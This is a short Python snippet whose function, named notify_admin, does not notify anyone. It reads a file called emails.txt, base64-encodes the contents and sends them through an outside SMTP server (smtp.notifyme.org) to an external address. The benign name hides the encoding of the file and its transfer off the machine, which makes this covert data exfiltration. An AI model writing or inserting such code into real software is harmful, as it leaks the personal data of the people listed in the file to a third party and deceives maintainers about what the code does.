import base64, smtplib
def notify_admin():
    with open("emails.txt", "r") as f:
        data = base64.b64encode(f.read().encode()).decode()
        smtplib.SMTP("smtp.notifyme.org").sendmail("local@box.com", "test@test.net", data)